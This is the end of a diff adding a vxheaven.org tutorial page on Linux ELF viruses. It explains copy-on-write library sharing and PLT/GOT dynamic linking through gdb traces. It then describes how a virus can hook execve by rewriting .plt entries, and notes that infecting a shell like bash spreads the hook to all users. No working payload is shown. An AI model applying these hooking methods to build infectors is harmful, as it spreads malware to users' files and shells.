+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">popad</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; 0x40073000</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br/>
+&nbsp;</div>
+<p>Note that this program without using mprotect would generate a general protection fault. Now try to execute simultaneously 2 copies of the program. The first page would unprotect a libc page and modify the first bytes of the call to getpid putting them to 0; the second copy is stopped by gdb in the main position for test what value is in the 0x40073000 address. The value won't be 0, it would be the original value.</p>
+<p>This is because Linux doesn't load its libraries in shared arenas, it loads them in the PerProcess memory. But if the PerProcess memory is different for each process, do the libraries get loaded with each executable, occupying unnecessary memory? The answer is NO, the solution is in the copy-on-write mechanism that allows the sharing of read/write memory pages between different processes, when these pages are in the memory of the process. When the program is load in memory, in the 0x40073000 address will be the memory page of the parent program, and if we try to write in it, the system will verify if it's a read/write or read only page. If it's read-only, the system will generate a page fault, and if it's read/write, the OS will generate a copy of that page for the child process, so when the program writes on it, it's really writing to an own page, not to the parent page. This method allows the share of libraries in memory, preserving the security, avoiding undesired attempts of global residency. Linux implements shared memory, but it's only for inteprocess communication mechanisms (IPC).</p>
+<h3>PerProcess residency</h3>
+<p>As i explained in the chapter of ELF infection, the ELF format is a very potent format, and between its important funcitonalities resides the dynamic link of functions.</p>
+<p>The Linux executables don't usually use the int 0x80, they leave that job to libraries like libc. With the usage of libraries we earn disk space, because that code is not inserted inside the executable each time. But these libraries can be loaded in any address of the PerProcess memory. This makes necessary the existence of one mechanism that allow the call to functions in files or different libraries, this mechanism is the dynamic link.</p>
+<p>There are 2 main sections that are there for make the dynamic link of functions. The section .plt (Procedure Linkage Table) and the section .got (Global Offset Table).</p>
+<p>Linux's dinamic link system had advantages among all the other systems. The PE format of Windows, for example, has specific sections for the linkage such as the Import Table, in it there are as many entryes as functions imported from libraries, and that references are resolved at load-time. In Linux, however, doesn't resolve them in load-time, it waits for the first execution of a system call for resolve the reference of that function. With the first execution, the program gives the control to the dynamic linker, that is a function inside the library we want to call, then the linker resolves the refernce and puts the absolute address of the system call in a table in memory called .got, so the next functions will jump directly to the function without needing to call previously to the dynamic linker. With that,we make better the system productivity avoiding to have to resolve that memory reference that maybe the executable won't execute. If we disassemble the next executable...</p>
+<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">#include &lt;unistd.h&gt;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">void</span> main<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; getpid<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #808080; font-style: italic;">/* 1st call to getpid */</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; getpid<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #808080; font-style: italic;">/* 2nd call to getpid */</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+&nbsp;</div>
+<p>We obtain the following assembler code</p>
+<pre class="source">
+      0x8048480 &lt;main>:    pushl %ebp
+      0x8048481 &lt;main+1>:  movl  %esp,%ebp
+      0x8048483 &lt;main+3>:  call  0x8048378 &lt;getpid>
+      0x8048488 &lt;main+8>:  call  0x8048378 &lt;getpid>
+      0x804848d &lt;main+13>: movl  %ebp,%esp
+      0x804848f &lt;main+15>: pop   %ebp
+      0x8048490 &lt;main+16>: ret
+</pre>
+<p>The calls to GETPID will be built as a jump to an entry in then .plt section, as we can see with the command "info file", the section .plt is mapped between 0x08048368 and 0x080483C8. If we continue tracing inside the .plt code we will see the following code:</p>
+<pre class="source">
+      0x8048378 &lt;getpid>:    jmp *0x80494e8
+      0x804837e &lt;getpid+6>:  push $0x0
+      0x8048383 &lt;getpid+11>: jmp 0x8048368 &lt;_init+8>
+</pre>
+<p>This will be the basic structure of a .plt entry. The first jmp will be a jump to the address contained in the address 0x80494E8. This address is part of the .got table, and in the load-time will have the value 0x804837E.</p>
+<pre class="source">
+      (gdb)x 0x80494e8
+      0x80494e8 &lt;__DTOR_END__+16>:  0x0804837e
+</pre>
+<p>As it's the first time we call to GETPID in the executavle, this will have to make a jump to the dynamic linker for obtain the address of the function in the library. For that it makes a push 0x0, where 0x0 is the pointer inside the reloc area that specifies to the dynamic linker what's the .got entry it has to modify. After, it makes a jmp 0x8048368, where 0x8048368 is the address of the first entry of the .plt section. The first entry of the .plt is special, because it's only used for call to the dynamic linker. If we contine debugging, we'll see the structure of the first .plt entry.</p>
+<pre class="source">      
+      0x8048368 &lt;_init+8>:  pushl 0x80494e0
+      0x804836e &lt;_init+14>: jmp   *0x80494e4
+</pre>
+<p>Firstly, it puts on stack the value 0x80494E0, that corresponds with the 2nd entry in the .got table, and after it makes a jump to the address contained in 0x80494E4 (the third entry of the .got). The 3 first entries of the .got doesn't contain pointers to the .plt at load-time, they are special entries. The first one contains a pointer to the .dynamic section, and the third one is filled with a pointer to the position of the dynamic linker.</p>
+<pre>     
+      (gdb)x 0x80494e4
+      0x80494e4 &lt;__DTOR_END__+12>: 0x40004180
+</pre>
+<p>So if we continue tracing, we'll see the code of the dynamic linker, already in the memory space of the library. When the program returns from the system call, in the .got section corresponding to GETPID, the linker will have put the absolute address of the function. If we continue tracing, in the second call to GETPID, we could see the new value in the .got section.</p>
+<pre>     
+      (gdb)x 0x80494e8
+      0x80494e8 &lt;__DTOR_END__+16>:  0x40073000
+</pre>
+<p>so, with the instruction jmp *0x80494E0 we will jump directly to the function without calling to the dynamic linker.</p>
+<p>This mechanism allows the hook of system calls inside the memory of the own process, it's the denominated PerProcess residency. A virus with this mechanism can hook, for example, the execve call, modifying the .plt entry that corresponds with that call, exchanging the jmp *address_in_got by a jmp *virus_address. However, the virus, being executed in Ring-3, will have the eternal limitations in the file access, and will be only able to infect the files the user can have access to. Another limitation is that it only hooks system call in contaminated files. Clean files being executed won't have their calls hooked by the virus.</p>
+<p>However, the possibilities of this method are really impressive, if a command interpret like bask or sh is infected, then, because they are commands executed by all users, the hook of execve in a PerProcess way could be as effective as a global residency.</p>
+[<a style="" href="/lib/?lang=EN&amp;index=UN#vxx04">Back to index</a>] [<a href="/lib/vxx04.html#disqus_thread">Comments</a>]<br/> <div id="disqus_thread"></div>
+<script type="text/rocketscript">
+        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname
+
+        /* * * DON'T EDIT BELOW THIS LINE * * */
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
+<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
+<div style="margin-top: 2px; float: left;" class="adsapeu">
+<script type="text/rocketscript">
+<!--
+var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
+//-->
+</script>
+</div>
+<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
+<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vxx04">de</a><a href="/lib/index.php?lang=en&amp;id=vxx04">en</a><a href="/lib/index.php?lang=es&amp;id=vxx04">es</a><a href="/lib/index.php?lang=it&amp;id=vxx04">it</a><a href="/lib/index.php?lang=fr&amp;id=vxx04">fr</a><a href="/lib/index.php?lang=pl&amp;id=vxx04">pl</a><a href="/lib/index.php?lang=ru&amp;id=vxx04">ru</a><a href="/lib/index.php?lang=ua&amp;id=vxx04">ua</a></div>
+</body>
+</html>
